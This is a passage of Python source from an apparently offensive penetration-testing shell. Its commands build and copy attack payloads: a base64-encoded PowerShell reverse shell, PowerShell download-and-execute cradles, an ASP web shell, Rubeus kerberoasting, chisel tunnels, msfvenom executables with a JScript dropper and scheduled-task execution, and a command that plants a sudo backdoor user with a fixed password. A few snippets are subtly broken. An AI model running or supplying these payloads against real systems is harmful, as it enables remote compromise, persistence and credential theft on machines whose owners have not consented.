        os.system(f"sudo systemctl status ssh")
        return

    def do_nmapscripthelp(self, line):
        """help to know nmap scripts: nmap --script-help 'snmp*'"""
        if not line:
            print_error("you must pass the script to find by argument.")
            return

        print_msg(f"Try... nmap --script-help '{line}*'{RESET}")
        os.system(f"nmap --script-help '{line}*'")
        print_msg(
            f"now you can run : {MAGENTA} sh sudo nmap -sCV -p <port> --script <script1,script2 <ip> {RESET}"
        )
        return

    def do_apropos(self, line):
        """
        Search for commands matching the given parameter in the cmd interface and optionally extend the search using the system's `apropos` command.

        :param line: The search term to find matching commands.

        :returns: None

        Manual execution:
        To manually search for commands matching a term using the `apropos` command, use the following command:

            apropos <search_term>

        Example:
            apropos network

        The `apropos` command will search for commands and documentation that match the given search term.

        The function also searches within the available commands in the cmd interface.
        """
        # Search within the cmd commands
        matched_cmds = [cmd for cmd in self.get_names() if line in cmd]

        if matched_cmds:
            print_msg("Commands found in the cmd interface:")
            for cmd in matched_cmds:
                print_msg(f"  {cmd.replace('do_','').replace('run_', 'run ')}")
        else:
            print_warn("No matching commands found in the cmd interface.")

        # Ask if the user wants to extend the search using the system's apropos command
        extend_search = input(
            f"    {YELLOW}[?] {WHITE}Do you want to extend the search using the system's {GREEN}`apropos`{WHITE} command? {MAGENTA}(y/n): {RESET}"
        )

        if extend_search.lower() == "y":
            print_msg(f"Searching for '{line}' using `apropos`...")
            os.system(f"apropos {line}")
        return

    def do_searchhash(self, line):
        """help to know search hashcat hash types: hashcat -h | grep -i <ARGUMENT>"""
        if not line:
            print_error("you must pass the hash type to find by argument.")
            return

        print_msg(f"Try... hashcat -h | grep -i {line}{RESET}")
        os.system(f"hashcat -h | grep -i {line}")
        print_msg(f"now you can run : {MAGENTA} hashcat NNN sessions/hash.txt {RESET}")
        return

    def do_clean(self, line):
        """delete all from sessions"""
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        os.system(
            f"rm sessions/cookie.txt sessions/{rhost} sessions/*{rhost}* sessions/aav.vbs sessions/*.html external/.exploit sessions/credentials.txt sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf"
        )
        print_msg(f"Cleanned sessions & external directory. {RESET}")
        return

    def do_pyautomate(self, line):
        """pyautomate automatization of tools to pwn a target all rights https://github.com/honze-net/pwntomate"""
        directory = "sessions"
        # Obtener la lista de archivos en el directorio
        files = os.listdir(directory)

        # Filtrar solo los archivos .xml
        xml_files = [file for file in files if file.endswith(".xml")]
        path = os.getcwd()
        # Para cada archivo XML, ejecutar el comando
        for xml_file in xml_files:
            xml_path = os.path.join(directory, xml_file)
            command = f"python3 pwntomate.py {xml_path} -x -b {path}/sessions"
            print_msg(f"Executing command: {MAGENTA}{command}{RESET}")
            try:
                subprocess.run(command, shell=True, check=True)
            except subprocess.CalledProcessError as e:
                print_error(f"Error executing command for {xml_file}: {e}{RESET}")
        print_msg(f"{YELLOW}Target was pwntomated 🍅. {RESET}")
        return

    def do_alias(self, line):
        """Imprime todos los alias configurados."""
        aliases = LazyOwnShell().aliases
        for alias, command in aliases.items():
            print_msg(
                f"{WHITE} Alias {GREEN} {alias}{WHITE} : Full command: {CYAN}{command}{RESET} "
            )
        return

    def do_tcpdump_icmp(self, line):
        """se pone en escucha con la interfaz señalada por argumento ej: tcpdump_icmp tun0"""
        if not line:
            print_error(
                "necesitas pasarle la interfaz que se quedarà en escucha ej: tcpdump_icmp tun0"
            )
            return
        print_msg(f"{WHITE}sudo tcpdump -i {GREEN}{line}{WHITE}{CYAN} icmp -n{RESET} ")
        os.system(f"sudo tcpdump -i {line} icmp -n")
        return

    def do_rdp(self, line):
        """
        Reads credentials from a file, encrypts the password, and executes the RDP connection command.

        1. Reads credentials:
            - Reads the username and password from the `sessions/credentials.txt` file.

        2. Encrypts the password:
            - Uses `remmina --encrypt-password` to encrypt the password obtained from the file.

        3. Executes the RDP connection command:
            - Uses the encrypted password to construct and execute the `remmina -c` command to initiate the RDP connection.

        :param line: This function does not use any arguments.
        :type line: str
        :returns: None

        Manual execution:
        To manually execute the command:
        - Ensure `sessions/credentials.txt` contains the credentials in the format `username:password`.
        - Run the `rdp` command to read the credentials, encrypt the password, and connect to the RDP server.
        Example usage: `rdp`
        """
        path = os.getcwd()
        credentials_file = f'{path}/sessions/credentials.txt'
        
        if not os.path.isfile(credentials_file):
            print_error("Error: Credentials file not found.")
            return
        
        with open(credentials_file, 'r') as file:
            credentials = file.readline().strip()
        
        if not credentials:
            print_error("Error: No credentials found in the file.")
            return
        
        # Split credentials into username and password
        try:
            username, password = credentials.split(':')
        except ValueError:
            print_error("Error: Invalid credentials format in the file.")
            return
        
        rhost = self.params['rhost']
        
        if not check_rhost(rhost):
            print_error("Error: Invalid or undefined rhost.")
            return

        # Construct and execute the remmina command
        remmina_command = f'remmina -c rdp://{username}@{rhost}'
        password = password.replace('\r', '').replace('\n', '').splitlines()[0]
        print_msg(password)
        command = f'printf "{password}" | xclip -sel clip'
        os.system(command)
        
        print_msg(f"Executing command: {remmina_command}")
        try:
            subprocess.run(remmina_command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Error executing remmina command: {e}")
        return

    def do_base64encode(self, line):
        """
        Encodes a given string into Base64 format.

        1. Encodes the input string:
            - Uses the `base64` library to encode the provided string into Base64 format.

        2. Displays the encoded string:
            - Prints the Base64 encoded string to the terminal.

        :param line: The string to encode in Base64 format.
        :type line: str
        :returns: None

        Manual execution:
        To manually encode a string in Base64:
        - Provide the string to the command and it will print the Base64 encoded result.
        Example usage: `base64encode HelloWorld`
        """
        if line:
            # Encode the input line to Base64
            encoded_bytes = base64.b64encode(line.encode('utf-8'))
            encoded_str = encoded_bytes.decode('utf-8')
            print_msg(encoded_str)
        else:
            print_error("Error: No input provided for encoding.")

    def do_base64decode(self, line):
        """
        Decodes a Base64 encoded string.

        1. Decodes the Base64 string:
            - Uses the `base64` library to decode the provided Base64 encoded string back to its original form.

        2. Displays the decoded string:
            - Prints the decoded string to the terminal.

        :param line: The Base64 encoded string to decode.
        :type line: str
        :returns: None

        Manual execution:
        To manually decode a Base64 encoded string:
        - Provide the Base64 encoded string to the command and it will print the decoded result.
        Example usage: `base64decode SGVsbG9Xb3JsZA==`
        """
        if line:
            try:
                # Decode the Base64 encoded line
                decoded_bytes = base64.b64decode(line)
                decoded_str = decoded_bytes.decode('utf-8')
                print_msg(decoded_str)
            except Exception as e:
                print_error(f"Error decoding Base64 string: {e}")
        else:
            print_error("Error: No input provided for decoding.")

    def do_grisun0(self, line):
        """
        Creates and copies a shell command to add a new user `grisun0`, set a password, add the user to the sudo group, and switch to the user.

        1. Displays the command:
            - Prints the command to add the user `grisun0` with home directory `/home/.grisun0`, set the password, add the user to the `sudo` group, set the appropriate permissions, and switch to the user.

        2. Copies the command to clipboard:
            - Uses `xclip` to copy the command to the clipboard for easy pasting.

        :param line: This function does not use any arguments.
        :type line: str
        :returns: None

        Manual execution:
        To manually execute the command:
        - Copy the command from the clipboard.
        - Run it in a terminal to create the user and set up the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0
        Note: Ensure `xclip` is installed and available on your system.
        """

        print_msg(f"{WHITE}useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0{RESET} ")
        os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0\" | xclip -sel clip")
        print_warn("Copied to clip ;)")
        return

    def do_winbase64payload(self, line):
        """
        Creates a base64 encoded PowerShell payload specifically for Windows to execute a `.ps1` script from `lhost`.

        1. Checks if `lhost` is set:
            - Displays an error message and exits if `lhost` is not set.

        2. Checks if a file name is provided:
            - Displays an error message and exits if no file name is provided.

        3. Constructs a PowerShell command:
            - The command downloads and executes a `.ps1` script from `lhost` using `New-Object WebClient`.

        4. Encodes the PowerShell command:
            - Converts the command to UTF-16LE encoding.
            - Encodes the UTF-16LE encoded command to base64.
            - Copies the final base64 command to the clipboard using `xclip`.

        :param line: The name of the `.ps1` file located in the `sessions` directory.
        :type line: str
        :returns: None

        Manual execution:
        To manually use the payload:
        - Ensure `lhost` is set to the correct IP address.
        - Place the `.ps1` file in the `sessions` directory.
        - Use `xclip` to copy the generated base64 command to the clipboard.

        Note: Ensure `iconv`, `base64`, and `xclip` are installed and available on your system.
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(f"lhost debe estàr seteado. Ej: set lhost 10.10.10.10")
            return
        if not line:
            print_error(
                f"Debes pasarle el nombre del archivo puesto en el directorio sessions ejemplo: {GREEN}winbase64payload payload.ps1"
            )
            return

        os.system(
            f"printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\"  iconv -t utf-16le | base64 -w 0 | xclip -sel clip"
        )
        print_msg(
            f"Try... printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\" | iconv -t utf-16le | base64"
        )
        print_msg("copied to clipboard")
        return

    def do_revwin(self, line):
        """
        Creates a base64 encoded PowerShell reverse shell payload specifically for Windows to execute a `.ps1` script from `lhost`.

        1. Checks if `lhost` and `lport` are set and valid:
            - Uses `check_lhost(lhost)` to verify the `lhost` parameter.
            - Uses `check_lport(lport)` to verify the `lport` parameter.
            - Exits the function if either `lhost` or `lport` is invalid.

        2. Constructs a PowerShell reverse shell command with the following structure:
            - Connects to the specified `lhost` and `lport` using `TCPClient`.
            - Reads data from the TCP stream, executes it, and sends back the results.
            - Appends the current path to the response for interactive use.

        3. Encodes the PowerShell command:
            - Encodes the command in UTF-16LE.
            - Converts the UTF-16LE encoded command to base64.
            - Creates a PowerShell command that executes the base64 encoded payload.

        4. Copies the final PowerShell command to the clipboard:
            - Uses `xclip` to copy the command to the clipboard.

        :param line: This parameter is not used in the function but is present for consistency with the method signature.
        :type line: str
        :returns: None

        Manual execution:
        To manually use the payload:
        - Ensure `lhost` and `lport` are correctly set.
        - Use `xclip` to copy the generated PowerShell command to the clipboard.

        Note: Ensure `xclip` is installed and available on your system.
        """


        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        if not check_lport(lport):
            return

        cmd = """$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""".replace(
            "{lhost}", lhost
        ).replace("{lport}", str(lport))
        # Codifica el comando en UTF-16LE
        utf16le_encoded = cmd.encode("utf-16le")
        # Codifica el resultado en base64
        base64_encoded = base64.b64encode(utf16le_encoded)
        # Convierte el resultado a una cadena y elimina el salto de línea final
        base64_string = base64_encoded.decode("utf-8").strip()
        cmdd = f"""powershell -e {base64_string}"""
        os.system(f'printf "{cmdd}" | xclip -sel clip')
        print_msg(f'printf "{cmdd}" | xclip -sel clip')

        return

    def do_asprevbase64(self, line):
        """
        Creates a base64 encoded ASP reverse shell payload and copies it to the clipboard.

        1. Checks if a base64 encoded payload is provided:
            - If no payload is provided, displays an error message and exits the function.

        2. If a payload is provided:
            - Creates an ASP script that uses `WScript.Shell` to execute a PowerShell command encoded in base64.
            - The created ASP script writes the result of the PowerShell command to the response output.
            - Uses `xclip` to copy the ASP script to the clipboard with the provided base64 encoded payload.

        :param line: The base64 encoded payload to be used in the ASP reverse shell.
        :type line: str
        :returns: None

        Manual execution:
        To manually create the ASP payload:
        - Ensure you have the base64 encoded payload ready.
        - Use `xclip` to copy the provided command to the clipboard.

        Note: Ensure `xclip` is installed and available on your system. For help on creating the base64 encoded payload, see `help winbase64payload`.
        """

        if not line:
            print_error(
                f"you need pass the payload in base64 as argument Ex: {GREEN}asprevbase64 LW5JRVgoTmV3LU9iamVjdCBOZXcuV2ViQ2xpZW50KS5kb3dubG9hZFN0cmluZygnaHR0cDovLzEwLjEwLjE0LjI0MS9wcy5wczEnKSBpY29udiAtdCB1dGYtMTZsZQo="
            )
            return
        os.system(
            f'echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip'
        )
        print_msg(
            f'Try... echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip'
        )
        return

    def do_rubeus(self, line):
        """
        Copies a command to the clipboard for downloading and running Rubeus.

        1. Checks if `lhost` (local host IP) is set:
            - If `lhost` is not set, displays an error message and exits the function.

        2. If `lhost` is set:
            - Displays a message indicating that the Rubeus downloader command has been copied to the clipboard.
            - The copied command downloads Rubeus from the specified `lhost` and saves it as `Rubeus.exe`.
            - Uses `xclip` to copy the following command to the clipboard:
            - `iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password`

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that `lhost` is set correctly.
        - Use `xclip` to copy the provided command to the clipboard.
        - Execute the downloaded Rubeus executable with the provided arguments.

        Note: Ensure `xclip` is installed and available on your system.
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(f"lhost must be set use set lhost <ip>{RESET}")
            return

        print_msg(
            f"{YELLOW}Rubeus downloader (echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe' | xclip -sel clip) copied to clipboard. {RESET}"
        )
        os.system(
            f"echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password' | xclip -sel clip"
        )
        return

    def do_socat(self, line):
        """
        Sets up and runs a `socat` tunnel with SOCKS4A proxy support.

        1. If no `line` (IP:port) argument is provided:
            - Displays an error message indicating the need to pass `ip:port`.
            - Exits the function.

        2. Displays a message instructing the user to configure `socks5` at `127.0.0.1:1080` in `/etc/proxychains.conf`.

        3. If a valid `line` argument is provided:
            - Displays the command being run: `socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080`.
            - Executes the `socat` command to listen on port 1080 and forward traffic to the specified IP and port using SOCKS4A proxy.
            - Prints a shutdown message for the `socat` tunnel at port 1080.

        :param line: The IP and port (formatted as `ip:port`) to forward traffic to through the SOCKS4A proxy.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Configure the `socks5` proxy settings in `/etc/proxychains.conf`.
        - Use the `socat` command with appropriate IP and port.

        Note: Ensure that `socat` is installed and properly configured on your system.
        """

        print_msg(
            f"You must seted {GREEN}socks5 127.0.0.1 1080 {YELLOW}at {GREEN}/etc/proxychains.conf{RESET}"
        )
        if not line:
            print_error(
                f"You must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} "
            )
            return
        print_msg(
            f"Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}"
        )
        os.system(f"socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080")
        print_msg(
            f"{YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}"
        )
        return

    def do_chisel(self, line):
        """
    Automates the setup and execution of Chisel server and client for tunneling and port forwarding.

    1. If no `lhost` (local host IP) is set:
        - Displays an error message indicating the need to set `lhost` using the `set` command.
        - Exits the function.

    2. If no port argument is provided:
        - Displays an error message indicating the need to provide a port number.
        - Exits the function.

    3. If required Chisel files are not present:
        - Displays an error message prompting the user to run the `download_resources` command.
        - Exits the function.

    4. If a valid port is provided:
        - Displays usage instructions for the Linux and Windows payloads.
        - Constructs and copies the appropriate Chisel command to the clipboard based on user choice (1 for Windows, 2 for Linux).
        - Extracts and sets up Chisel binaries for Linux and Windows from compressed files.
        - Runs the Chisel server on the specified port and prints a shutdown message.

    :param line: The command line input containing the port number for Chisel setup.
    :type line: str
    :returns: None

    Manual execution:
    To manually run these tasks, you would need to:
    - Ensure `lhost` is set using `set lhost <IP>`.
    - Provide the port number when calling the function.
    - Run the command `download_resources` if the Chisel files are missing.
    - Manually execute the Chisel commands for Linux or Windows as copied to the clipboard.

    Note: Ensure that all required files (`chisel_1.9.1_linux_amd64.gz` and `chisel_1.9.1_windows_amd64.gz`) are available in the `sessions` directory.
    """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(
                f"You must set lhost ex:{GREEN} set lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} "
            )
            return
        if not line:
            print_error(
                f"You must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
            )
            return
        if not os.path.exists(
            "sessions/chisel_1.9.1_linux_amd64.gz"
        ) or not os.path.exists("./sessions/chisel_1.9.1_windows_amd64.gz"):
            print_error(
                f"You must run the command {GREEN}download_resources{YELLOW} before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}"
            )
            return

        args = line.split(" ")

        if len(args) == 1:
            lport = args[0]
            print_msg(
                f"Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D"
            )
            command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile pivot.exe ;"""
            command += " .\\"
            command += f"""pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
            command1 = f"echo '{command}' | xclip -sel clip"

            command = f"""curl http://{lhost}/chisel_1.9.1_linux_amd64 -o chisel ; chmod +x chisel ; """
            command += " ./"
            command += f"""chisel client -v {lhost}:{lport} R:127.0.0.1:socks"""
            command2 = f"echo '{command}' | xclip -sel clip"

            print_warn("<modo de uso>")
            print_msg(f"{command1=}")
            print_msg(f"{command2=}")
            print_warn("</modo de uso>")

            choice = input(
                f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
            ).strip()

            if choice == "1":
                os.system(command1)
                print_msg(f"Payload 1 copied to Clipboard")
            elif choice == "2":
                os.system(command2)
                print_msg(f"Payload 2 copied to Clipboard")

            else:
                print_error("Invalid choice. Please select 1 or 2")
                return

            os.system(
                f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && upx chisel.exe && upx chisel_1.9.1_linux_amd64 && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v"
            )
            print_msg(
                f"Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}"
            )

        else:
            print_error(
                f"you must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
            )
        return

    def do_msf(self, line):
        """
        Automates various Metasploit tasks including scanning for vulnerabilities, setting up reverse shells, and creating payloads.

        1. If no arguments are provided:
            - Retrieves the target IP (`rhost`) from parameters.
            - Checks if the IP is valid using `check_rhost()`. If invalid, exits the function.
            - Creates a Metasploit resource script (`/tmp/scan_vulnerabilities.rc`) that includes commands for scanning ports, enumerating services, and checking for known vulnerabilities.
            - Executes Metasploit with the created resource script and then deletes the temporary file.
            - Prints a shutdown message after running the scan.

        2. If the argument starts with "rev":
            - Sets up a reverse shell payload based on the specified platform and user choice (with or without meterpreter).
            - Creates a Metasploit resource script (`/tmp/handler.rc`) for handling incoming reverse shell connections.
            - Executes Metasploit with the created resource script and then deletes the temporary file.
            - Prints a shutdown message after setting up the handler.

        3. If the argument starts with "lnk":
            - Configures parameters (`lhost`, `lport`) for creating a payload.
            - Uses `msfvenom` to generate a payload executable and saves it in the `sessions` directory.
            - Creates an XML file (`download_payload.xml`) that will be used to download and execute the payload on a target machine.
            - Creates a PowerShell script (`create_lnk.ps1`) to generate a shortcut file (`.lnk`) pointing to the payload.
            - Prints instructions and generates a command to copy to the clipboard for setting up the payload and files.

        4. If the argument starts with "autoroute":
            - Configures parameters for setting up a Metasploit session and autorouting.
            - Creates a Metasploit resource script (`/tmp/autoroute.rc`) to handle exploit sessions and set up autorouting.
            - Executes Metasploit with the resource script and starts a SOCKS proxy for routing traffic.
            - Configures proxychains to use the Metasploit SOCKS proxy and prints instructions for using proxychains with tools.

        :param line: The command line input that determines which Metasploit task to automate.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - For scanning: Create and run the resource script using `msfconsole -r /tmp/scan_vulnerabilities.rc`.
        - For reverse shells: Configure and run the resource script with the appropriate payload settings.
        - For payload generation and shortcuts: Use `msfvenom` and create XML and PowerShell scripts as specified.
        - For autorouting: Create and run the resource script for autorouting and configure proxychains.

        Note: Ensure all required parameters (`lhost`, `lport`, etc.) are set before running these tasks.
        """

        if not line:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
            TARGET_IP = rhost
            # Ruta del archivo temporal
            rc_file_path = "/tmp/scan_vulnerabilities.rc"

            # Crear el archivo de comandos para Metasploit
            with open(rc_file_path, "w") as file:
                file.write(f"""
            # Configurar la IP del objetivo
            setg RHOSTS {TARGET_IP}

            # Escanear puertos abiertos
            use auxiliary/scanner/portscan/tcp
            set THREADS 10
            run

            # Enumerar servicios y versiones
            use auxiliary/scanner/portscan/tcp
            set PORTS 1-65535
            run

            # Buscar vulnerabilidades conocidas
            use auxiliary/scanner/vuln/ms17_010_eternalblue
            set RHOSTS {TARGET_IP}
            run

            # Probar exploits y enumerar vulnerabilidades
            use auxiliary/scanner/ftp/anonymous
            set RHOSTS {TARGET_IP}
            run

            # Buscar módulos de explotación de vulnerabilidades
            search ms17_010

            # Terminar la sesión
            exit
            """)

            # Ejecutar Metasploit con el archivo de comandos
            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
                # Eliminar el archivo temporal
            print_msg(f"{YELLOW}Shutdown msfconsole scan {RED} [;,;] {RESET}")
            return
        elif line.startswith("rev"):
            """Automate msfconsole exploit setup"""
            args = line.split(" ")

            if len(args) == 1:
                setpayload = "windows/meterpreter/reverse_tcp"
            elif len(args) == 2:
                if args[1] in ["win", "win64", "lin", "lin64", "mac", "mac64"]:
                    print_msg("Select payload type:")
                    print_msg("1: With meterpreter")
                    print_msg("2: Without meterpreter")
                    choice = input("Enter your choice (1 or 2): ").strip()

                    if args[1] == "win":
                        if choice == "1":
                            setpayload = "windows/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "windows/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "win64":
                        if choice == "1":
                            setpayload = "windows/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "windows/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "lin":
                        if choice == "1":
                            setpayload = "linux/x86/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "linux/x86/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "lin64":
                        if choice == "1":
                            setpayload = "linux/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "linux/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "mac":
                        if choice == "1":
                            setpayload = "osx/x86/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "osx/x86/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "mac64":
                        if choice == "1":
                            setpayload = "osx/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "osx/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return

                    print_msg(f"Selected payload: {setpayload}")

                    # Here you would continue with the rest of your function, using the `setpayload` value
                else:
                    print_error("Invalid platform specified")

            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be set use set lhost <ip>{RESET}")
                return
            # Aquí deberías configurar tu IP y otros parámetros necesarios
            lhost = f"{lhost}"  # Reemplaza con tu dirección IP
            lport = f"{lport}"  # Puedes cambiar el puerto si lo necesitas

            # Ruta del archivo temporal
            rc_file_path = "/tmp/handler.rc"

            # Crear el archivo de comandos para Metasploit
            with open(rc_file_path, "w") as file:
                file.write(f"""
                use exploit/multi/handler
                set payload {setpayload}
                set LHOST {lhost}
                set LPORT {lport}
                run
                """)

            # Ejecutar Metasploit con el archivo de comandos
            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

            # Eliminar el archivo temporal
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
            print_msg(f"{YELLOW}Shutdown rev meterpreter sessions {RED} [;,;] {RESET}")
            return

        elif line.startswith("lnk"):
            # Parámetros necesarios
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be set use set lhost <ip>{RESET}")
                return
            # Aquí deberías configurar tu IP y otros parámetros necesarios
            lhost = f"{lhost}"  # Reemplaza con tu dirección IP
            lport = f"{lport}"  # Puedes cambiar el puerto si lo necesitas

            web_root = "sessions"
            payload = "C:\\xampp\\htdocs\\payload.exe"  # Ruta al payload
            args = line.split(" ")
            if not lhost or not lport:
                print_error(
                    "lhost o lport deben estar establecidos. Usa 'set lhost <ip>'"
                )
            else:
                if len(args) == 1:
                    setpayload = "windows/meterpreter/reverse_tcp"
                elif len(args) == 2:
                    if args[1] == "win":
                        setpayload = "windows/meterpreter/reverse_tcp"
                    if args[1] == "win64":
                        setpayload = "windows/x64/meterpreter/reverse_tcp"

                # Paso 1: Crear el payload con msfvenom
                payload_path = os.path.join(web_root, "payload.exe")
                msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                subprocess.run(msfvenom_cmd, shell=True, check=True)
                print_msg("Payload creado con éxito en: " + payload_path)

                # Paso 2: Crear el archivo XML para la descarga
                xml_content = f"""<?xml version="1.0"?>
                <job>
                <script language="JScript">
                    var objShell = new ActiveXObject("WScript.Shell");
                    var objExec = objShell.Exec("cmd.exe /c powershell -Command \\"Invoke-WebRequest -Uri 'http://{lhost}/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\\"");
                </script>
                </job>
                """
                xml_path = os.path.join(web_root, "download_payload.xml")
                with open(xml_path, "w") as xml_file:
                    xml_file.write(xml_content)
                print_msg("Archivo XML creado con éxito en " + xml_path)

                # Este paso debe realizarse manualmente: Inserta la macro en tu documento de Office y guárdalo en la ruta especificada.
                print_msg(f"Asegúrate de que el payload esté en: {payload}")

                # Paso 4: Crear el archivo .lnk con PowerShell
                ps_script_content = f"""
                $WshShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WshShell.CreateShortcut("c:\Common Applications\Calculator.lnk")
                $Shortcut.TargetPath = "{payload}"
                $Shortcut.Save()
                """.replace("                ", "")
                ps_script_path = os.path.join("sessions", "create_lnk.ps1")
                with open(ps_script_path, "w") as ps_script_file:
                    ps_script_file.write(ps_script_content)

                print_msg(f"Script de PowerShell creado en {ps_script_path}")
                print_msg(
                    "Ejecuta este script en la máquina Windows para crear el archivo .lnk contenido:"
                )
                print(ps_script_content)
                # Nota: Este paso debe ejecutarse en la máquina Windows
                cmd = f"""echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/create_lnk.ps1\' -OutFile \'C:\\Windows\\Temp\\create_lnk.ps1\'; schtasks /create /tn \'DownloadPayload\' /ps1 \'C:\\Windows\\Temp\\create_lnk.ps1\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                print_msg(
                    f"El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web"
                )
                os.system(cmd)
                return

        elif line.startswith("autoroute"):
            # Set your parameters here
            args = line.split(" ")
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be set use set lhost <ip>{RESET}")
                return
            if len(args) == 1:
                setpayload = "windows/meterpreter/reverse_tcp"
            elif len(args) == 2:
                if args[1] == "win":
                    setpayload = "windows/meterpreter/reverse_tcp"
                if args[1] == "win64":
                    setpayload = "windows/x64/meterpreter/reverse_tcp"
                elif args[1] == "lin":
                    setpayload = "linux/x86/meterpreter/reverse_tcp"
                elif args[1] == "lin64":
                    setpayload = "linux/x64/meterpreter/reverse_tcp"
                elif args[1] == "mac":
                    setpayload = "osx/x86/shell_reverse_tcp"
                elif args[1] == "mac64":
                    setpayload = "osx/x64/meterpreter/reverse_tcp"

            session_id = (
                "1"  # The session ID for the active session (adjust as necessary)
            )
            target_subnet = "192.168.100.0"  # The target subnet
            netmask = "255.255.255.0"  # The netmask for the subnet

            # Step 1: Create a Metasploit Resource Script
